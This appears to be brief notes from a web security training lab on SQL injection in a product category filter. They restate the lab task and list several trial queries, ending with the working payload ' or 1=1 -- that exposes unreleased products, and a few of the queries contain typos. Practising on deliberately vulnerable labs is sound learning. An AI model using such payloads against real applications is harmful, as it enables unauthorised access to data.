This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

SELECT * FROM product WHERE category = ''--' And relesed =1

SELECT * FROM product WHERE category = ''' And relesed =1

SELECT * FROM product WHERE category = ''--' And relesed =1

SELECT * FROM product WHERE category = '' or 1=1 --' AND released = 1
